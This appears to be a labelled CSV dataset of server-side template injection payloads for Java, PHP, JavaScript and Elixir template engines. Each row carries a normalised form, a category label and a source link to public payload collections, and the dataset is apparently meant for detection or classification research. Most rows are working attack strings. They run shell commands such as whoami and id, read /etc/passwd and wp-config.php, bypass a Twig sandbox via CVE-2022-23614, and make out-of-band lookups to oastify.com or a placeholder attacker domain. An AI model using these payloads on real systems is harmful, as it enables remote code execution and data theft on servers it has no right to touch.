"${""http://www.google.com"".toURL().text}","${""S"".tourl().text}",java,unknown,1,uncertain,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"${new URL(""http://www.google.com"").getText()}","${newurl(""S"").gettext()}",java,unknown,1,uncertain,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"${""calc.exe"".exec()}","${""S"".exec()}",java,unknown,1,direct-execution,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"${""calc.exe"".execute()}","${""S"".execute()}",java,unknown,1,direct-execution,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"${this.evaluate(""9*9"") //(this is a Script class)}","${this.evaluate(""S"")//(thisisascriptclass)}",java,unknown,1,probe,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"${new org.codehaus.groovy.runtime.MethodClosure(""calc.exe"",""execute"").call()}","${neworg.codehaus.groovy.runtime.methodclosure(""S"",""S"").call()}",java,unknown,1,direct-execution,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"${x=new/**/String();for(i/**/in[105,100]){x+=((char)i).toString()};x.execute().text}${x=new/**/String();for(i/**/in[105,100]){x+=((char)i).toString()};x.execute().text}","${x=new/**/string();for(i/**/in[N,N]){x+=((char)i).tostring()};x.execute().text}${x=new/**/string();for(i/**/in[N,N]){x+=((char)i).tostring()};x.execute().text}",java,unknown,1,direct-execution,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"${ @ASTTest(value={assert java.lang.Runtime.getRuntime().exec(""whoami"")})","${@asttest(value={assertjava.lang.runtime.getruntime().exec(""S"")})",java,unknown,1,direct-execution,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"${ new groovy.lang.GroovyClassLoader().parseClass(""@groovy.transform.ASTTest(value={assert java.lang.Runtime.getRuntime().exec(\""calc.exe\"")})def x"") }","${newgroovy.lang.groovyclassloader().parseclass(""S""calc.exe\""S"")}",java,unknown,1,direct-execution,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"${'patt'.toString().replace('a', 'x')}","${'S'.tostring().replace('S','S')}",java,unknown,1,uncertain,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
${T(java.lang.Integer).valueOf('1')},${t(java.lang.integer).valueof('S')},java,unknown,1,uncertain,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"${"""".getClass().forName(""java.net.InetAddress"").getMethod(""getByName"","""".getClass()).invoke("""",""[ATTACKER.DOMAIN.TLD]"")}","${""S"".getclass().forname(""S"").getmethod(""S"",""S"".getclass()).invoke(""S"",""S"")}",java,unknown,1,introspection,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"${pageContext.request.getSession().setAttribute(""admin"",true)}","${pagecontext.request.getsession().setattribute(""S"",true)}",java,unknown,1,enumeration,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"${T(java.lang.Runtime).getRuntime().exec(""whoami"")}","${t(java.lang.runtime).getruntime().exec(""S"")}",java,unknown,1,direct-execution,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"#{session.setAttribute(""rtc"","""".getClass().forName(""java.lang.Runtime"").getDeclaredConstructors()[0])}","#{session.setattribute(""S"",""S"".getclass().forname(""S"").getdeclaredconstructors()[N])}",java,unknown,1,introspection,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"#{session.getAttribute(""rtc"").setAccessible(true)}","#{session.getattribute(""S"").setaccessible(true)}",java,unknown,1,uncertain,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"#{session.getAttribute(""rtc"").getRuntime().exec(""/bin/bash -c whoami"")}","#{session.getattribute(""S"").getruntime().exec(""S"")}",java,unknown,1,direct-execution,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
${''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(''.getClass().forName('java.lang.Runtime')).exec('whoami')},${'S'.getclass().forname('S').getmethods()[N].invoke('S'.getclass().forname('S')).exec('S')},java,unknown,1,introspection,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"${request.getClass().forName(""javax.script.ScriptEngineManager"").newInstance().getEngineByName(""js"").eval(""java.lang.Runtime.getRuntime().exec(\\\""whoami\\\"")""))}","${request.getclass().forname(""S"").newinstance().getenginebyname(""S"").eval(""S""whoami\\\""S""))}",java,unknown,1,introspection,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"${request.setAttribute(""c"","""".getClass().forName(""java.util.ArrayList"").newInstance())}","${request.setattribute(""S"",""S"".getclass().forname(""S"").newinstance())}",java,unknown,1,introspection,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"${request.getAttribute(""c"").add(""cmd.exe"")}","${request.getattribute(""S"").add(""S"")}",java,unknown,1,enumeration,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"${request.getAttribute(""c"").add(""/k"")}","${request.getattribute(""S"").add(""S"")}",java,unknown,1,enumeration,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"${request.getAttribute(""c"").add(""whoami"")}","${request.getattribute(""S"").add(""S"")}",java,unknown,1,enumeration,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"${request.setAttribute(""a"","""".getClass().forName(""java.lang.ProcessBuilder"").getDeclaredConstructors()[0].newInstance(request.getAttribute(""c"")).start())}","${request.setattribute(""S"",""S"".getclass().forname(""S"").getdeclaredconstructors()[N].newinstance(request.getattribute(""S"")).start())}",java,unknown,1,introspection,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"${request.getAttribute(""a"")}","${request.getattribute(""S"")}",java,unknown,1,enumeration,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"${T(java.lang.Integer).valueOf(""x""+T(java.lang.String).getConstructor(T(byte[])).newInstance(T(java.lang.Runtime).getRuntime().exec(""id"").inputStream.readAllBytes()))}","${t(java.lang.integer).valueof(""S""+t(java.lang.string).getconstructor(t(byte[])).newinstance(t(java.lang.runtime).getruntime().exec(""S"").inputstream.readallbytes()))}",java,unknown,1,direct-execution,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"${1/((T(java.lang.Runtime).getRuntime().exec(""id"").waitFor()==0)?1:0)+""""}","${N/((t(java.lang.runtime).getruntime().exec(""S"").waitfor()==N)?N:N)+""S""}",java,unknown,1,direct-execution,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"${(T(java.lang.Runtime).getRuntime().exec(""id"").waitFor().equals(0)?T(java.lang.Thread).sleep(5000):0).toString()}","${(t(java.lang.runtime).getruntime().exec(""S"").waitfor().equals(N)?t(java.lang.thread).sleep(N):N).tostring()}",java,unknown,1,direct-execution,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"{{passthru(implode(null,array_map(chr(99).chr(104).chr(114),[105,100])))}}","{{passthru(implode(null,array_map(chr(N).chr(N).chr(N),[N,N])))}}",php,unknown,1,direct-execution,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/PHP.md
{php}echo `id`;{/php} //deprecated in smarty v3,{php}echo`id`;{/php}//deprecatedinsmartyvN,php,unknown,1,direct-execution,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/PHP.md
"{system('ls')} // compatible v3, deprecated in v5","{system('S')}//compatiblevN,deprecatedinvN",php,unknown,1,direct-execution,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/PHP.md
"{system('cat index.php')} // compatible v3, deprecated in v5","{system('S')}//compatiblevN,deprecatedinvN",php,unknown,1,direct-execution,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/PHP.md
"{{passthru(implode(Null,array_map(chr(99)|cat:chr(104)|cat:chr(114),[105,100])))}}","{{passthru(implode(null,array_map(chr(N)|cat:chr(N)|cat:chr(N),[N,N])))}}",php,unknown,1,direct-execution,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/PHP.md
{{7*'7'}} would result in 49,{{N*'S'}}wouldresultinN,php,unknown,1,probe,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/PHP.md
"""Dear {first_name}"",","""S"",",php,unknown,1,uncertain,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/PHP.md
"""{{'/etc/passwd'|file_excerpt(1,30)}}""@","""S""@",php,unknown,1,uncertain,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/PHP.md
"{{include(""wp-config.php"")}}","{{include(""S"")}}",php,unknown,1,enumeration,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/PHP.md
"{{_self.env.registerUndefinedFilterCallback(""exec"")}}{{_self.env.getFilter(""id"")}}","{{_self.env.registerundefinedfiltercallback(""S"")}}{{_self.env.getfilter(""S"")}}",php,unknown,1,direct-execution,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/PHP.md
"{{[0]|reduce('system','id')}}","{{[N]|reduce('S','S')}}",php,unknown,1,feature-abuse,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/PHP.md
{{['id']|map('system')|join}},{{['S']|map('S')|join}},php,unknown,1,feature-abuse,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/PHP.md
"{{['id',1]|sort('system')|join}}","{{['S',N]|sort('S')|join}}",php,unknown,1,feature-abuse,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/PHP.md
{{['id']|filter('passthru')}},{{['S']|filter('S')}},php,unknown,1,direct-execution,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/PHP.md
{{['id']|map('passthru')}},{{['S']|map('S')}},php,unknown,1,direct-execution,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/PHP.md
{{['nslookup oastify.com']|filter('system')}},{{['S']|filter('S')}},php,unknown,1,feature-abuse,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/PHP.md
"{% for a in [""error_reporting"", ""1""]|sort(""ini_set"") %}{% endfor %} // Enable verbose error output for Error-Based","{%forain[""S"",""S""]|sort(""S"")%}{%endfor%}//enableverboseerroroutputforerror-based",php,unknown,1,feature-abuse,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/PHP.md
"{{_self.env.registerUndefinedFilterCallback(""shell_exec"")}}{%include [""Y:/A:/"", _self.env.getFilter(""id"")]|join%} // Error-Based RCE <= 1.19","{{_self.env.registerundefinedfiltercallback(""S"")}}{%include[""S"",_self.env.getfilter(""S"")]|join%}//error-basedrce<=N.N",php,unknown,1,direct-execution,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/PHP.md
"{{[0]|map([""xx"", {""id"": ""shell_exec""}|map(""call_user_func"")|join]|join)}} // Error-Based RCE >=1.41, >=2.10, >=3.0","{{[N]|map([""S"",{""S"":""S""}|map(""S"")|join]|join)}}//error-basedrce>=N.N,>=N.N,>=N.N",php,unknown,1,direct-execution,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/PHP.md
"{{_self.env.registerUndefinedFilterCallback(""shell_exec"")}}{{1/(_self.env.getFilter(""id && echo UniqueString"")|trim('\n') ends with ""UniqueString"")}} // Boolean-Based RCE <= 1.19","{{_self.env.registerundefinedfiltercallback(""S"")}}{{N/(_self.env.getfilter(""S"")|trim('S')endswith""S"")}}//boolean-basedrce<=N.N",php,unknown,1,direct-execution,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/PHP.md
"{{1/({""id && echo UniqueString"":""shell_exec""}|map(""call_user_func"")|join|trim('\n') ends with ""UniqueString"")}} // Boolean-Based RCE >=1.41, >=2.10, >=3.0","{{N/({""S"":""S""}|map(""S"")|join|trim('S')endswith""S"")}}//boolean-basedrce>=N.N,>=N.N,>=N.N",php,unknown,1,direct-execution,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/PHP.md
"{% set a = [""error_reporting"", ""1""]|sort(""ini_set"") %}{% set b = [""ob_start"", ""call_user_func""]|sort(""call_user_func"") %}{{ [""id"", 0]|sort(""system"") }}{% set a = [""ob_end_flush"", []]|sort(""call_user_func_array"")%} // Error-Based RCE with sandbox bypass using CVE-2022-23614","{%seta=[""S"",""S""]|sort(""S"")%}{%setb=[""S"",""S""]|sort(""S"")%}{{[""S"",N]|sort(""S"")}}{%seta=[""S"",[]]|sort(""S"")%}//error-basedrcewithsandboxbypassusingcve-N-N",php,unknown,1,probe,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/PHP.md
"{{ 1 / ([""id >>/dev/null && echo -n 1"", ""0""]|sort(""system"")|first == ""0"") }} // Boolean-Based RCE with sandbox bypass using CVE-2022-23614","{{N/([""S"",""S""]|sort(""S"")|first==""S"")}}//boolean-basedrcewithsandboxbypassusingcve-N-N",php,unknown,1,probe,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/PHP.md
{{ {'id':'shell_exec'}|map('call_user_func')|join }},{{{'S':'S'}|map('S')|join}},php,unknown,1,direct-execution,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/PHP.md
FILENAME{% set var = dump(_context)[OFFSET:LENGTH] %} {{ include(var) }},filename{%setvar=dump(_context)[offset:length]%}{{include(var)}},php,unknown,1,enumeration,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/PHP.md
"email=""{{app.request.query.filter(0,0,1024,{'options':'system'})}}""@attacker.tld","email=""S""@attacker.tld",php,unknown,1,enumeration,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/PHP.md
{%block U%}id000passthru{%endblock%}{%set x=block(_charset|first)|split(000)%}{{[x|first]|map(x|last)|join}},{%blocku%}idNpassthru{%endblock%}{%setx=block(_charset|first)|split(N)%}{{[x|first]|map(x|last)|join}},php,unknown,1,direct-execution,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/PHP.md
"{{id~passthru~_context|join|slice(2,2)|split(000)|map(_context|join|slice(5,8))}}","{{id~passthru~_context|join|slice(N,N)|split(N)|map(_context|join|slice(N,N))}}",php,unknown,1,direct-execution,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/PHP.md
"{var $X=""POC""}{$X}","{var$x=""S""}{$x}",php,unknown,1,uncertain,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/PHP.md
{php system('nslookup oastify.com')},{phpsystem('S')},php,unknown,1,direct-execution,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/PHP.md
Hello {NAME}.<br/>,hello{name}.<br/>,php,unknown,1,uncertain,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/PHP.md
<head><title>{PAGE_TITLE}</title></head>,<head><title>{page_title}</title></head>,php,unknown,1,uncertain,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/PHP.md
"<tr><td colspan=""2"">{NUM_AUTHORS}</td></tr>","<tr><tdcolspan=""S"">{num_authors}</td></tr>",php,unknown,1,uncertain,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/PHP.md
<tr><td>{AUTHOR_NAME}</td><td>{AUTHOR_EMAIL}</td></tr>,<tr><td>{author_name}</td><td>{author_email}</td></tr>,php,unknown,1,uncertain,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/PHP.md
"[""""][0 + !(global.process.mainModule.require(""child_process"").spawnSync(""id"", options={shell:true}).status===0)][""length""]","[""S""][N+!(global.process.mainmodule.require(""S"").spawnsync(""S"",options={shell:true}).status===N)][""S""]",javascript,unknown,1,direct-execution,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/JavaScript.md
{{this}},{{this}},javascript,unknown,1,uncertain,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/JavaScript.md
"{{#with ""s"" as |string|}}","{{#with""S""as|string|}}",javascript,unknown,1,uncertain,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/JavaScript.md
"{{#with ""e""}}","{{#with""S""}}",javascript,unknown,1,uncertain,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/JavaScript.md
{{#with split as |conslist|}},{{#withsplitas|conslist|}},javascript,unknown,1,uncertain,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/JavaScript.md
{{this.pop}},{{this.pop}},javascript,unknown,1,uncertain,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/JavaScript.md
"{{this.push (lookup string.sub ""constructor"")}}","{{this.push(lookupstring.sub""S"")}}",javascript,unknown,1,uncertain,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/JavaScript.md
{{#with string.split as |codelist|}},{{#withstring.splitas|codelist|}},javascript,unknown,1,uncertain,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/JavaScript.md
"{{this.push ""return require('child_process').execSync('ls -la');""}}","{{this.push""S""}}",javascript,unknown,1,direct-execution,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/JavaScript.md
{{#each conslist}},{{#eachconslist}},javascript,unknown,1,uncertain,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/JavaScript.md
{{#with (string.sub.apply 0 codelist)}},{{#with(string.sub.applyNcodelist)}},javascript,unknown,1,uncertain,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/JavaScript.md
{{/with}},{{/with}},javascript,unknown,1,uncertain,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/JavaScript.md
{{/each}},{{/each}},javascript,unknown,1,uncertain,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/JavaScript.md
"string = ""{{= username}}""","string=""S""",javascript,unknown,1,uncertain,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/JavaScript.md
{{= _.VERSION}},{{=_.version}},javascript,unknown,1,uncertain,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/JavaScript.md
${= _.VERSION},${=_.version},javascript,unknown,1,uncertain,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/JavaScript.md
<%= _.VERSION %>,<%=_.version%>,javascript,unknown,1,uncertain,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/JavaScript.md
{{= _.templateSettings.evaluate }},{{=_.templatesettings.evaluate}},javascript,unknown,1,uncertain,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/JavaScript.md
"{{x=Object}}{{w=a=new x}}{{w.type=""pipe""}}{{w.readable=1}}{{w.writable=1}}{{a.file=""/bin/sh""}}{{a.args=[""/bin/sh"",""-c"",""id;ls""]}}{{a.stdio=[w,w]}}{{process.binding(""spawn_sync"").spawn(a).output}}","{{x=object}}{{w=a=newx}}{{w.type=""S""}}{{w.readable=N}}{{w.writable=N}}{{a.file=""S""}}{{a.args=[""S"",""S"",""S""]}}{{a.stdio=[w,w]}}{{process.binding(""S"").spawn(a).output}}",javascript,unknown,1,direct-execution,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/JavaScript.md
"#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}","#{root.process.mainmodule.require('S').spawnsync('S',['S']).stdout}",javascript,unknown,1,direct-execution,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/JavaScript.md
"<%= File.read!(""/etc/passwd"") %>","<%=file.read!(""S"")%>",elixir,unknown,1,uncertain,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Elixir.md
"<%= elem(System.shell(""id""), 0) %> # Rendered RCE","<%=elem(system.shell(""S""),N)%>#renderedrce",elixir,unknown,1,uncertain,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Elixir.md
"<%= [1, 2][elem(System.shell(""id""), 0)] %> # Error-Based RCE","<%=[N,N][elem(system.shell(""S""),N)]%>#error-basedrce",elixir,unknown,1,uncertain,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Elixir.md
"<%= 1/((elem(System.shell(""id""), 1) == 0)&&1||0) %> # Boolean-Based RCE","<%=N/((elem(system.shell(""S""),N)==N)&&N||N)%>#boolean-basedrce",elixir,unknown,1,uncertain,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Elixir.md
"<%= elem(System.shell(""id && sleep 5""), 0) %> # Time-Based RCE","<%=elem(system.shell(""S""),N)%>#time-basedrce",elixir,unknown,1,uncertain,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Elixir.md
{{42*42}},{{N*N}},unknown,unknown,1,probe,https://github.com/danielmiessler/SecLists/blob/d9458f277ed978a608ad165e5eb2fdb389e4c7ee/Fuzzing/template-engines-expression.txt
{{{42*42}}},{{{N*N}}},unknown,unknown,1,probe,https://github.com/danielmiessler/SecLists/blob/d9458f277ed978a608ad165e5eb2fdb389e4c7ee/Fuzzing/template-engines-expression.txt
${42*42},${N*N},java,unknown,1,probe,https://github.com/danielmiessler/SecLists/blob/d9458f277ed978a608ad165e5eb2fdb389e4c7ee/Fuzzing/template-engines-expression.txt
<%=42*42 %>,<%=N*N%>,ruby,unknown,1,probe,https://github.com/danielmiessler/SecLists/blob/d9458f277ed978a608ad165e5eb2fdb389e4c7ee/Fuzzing/template-engines-expression.txt
{{=42*42}},{{=N*N}},unknown,unknown,1,probe,https://github.com/danielmiessler/SecLists/blob/d9458f277ed978a608ad165e5eb2fdb389e4c7ee/Fuzzing/template-engines-expression.txt
${donotexists|42*42},${donotexists|N*N},java,unknown,1,probe,https://github.com/danielmiessler/SecLists/blob/d9458f277ed978a608ad165e5eb2fdb389e4c7ee/Fuzzing/template-engines-expression.txt
[[${42*42}]],[[${N*N}]],java,unknown,1,probe,https://github.com/danielmiessler/SecLists/blob/d9458f277ed978a608ad165e5eb2fdb389e4c7ee/Fuzzing/template-engines-expression.txt
"D{{=""O""}}T","d{{=""S""}}t",unknown,unknown,1,uncertain,https://github.com/danielmiessler/SecLists/blob/d9458f277ed978a608ad165e5eb2fdb389e4c7ee/Fuzzing/template-engines-identification.txt
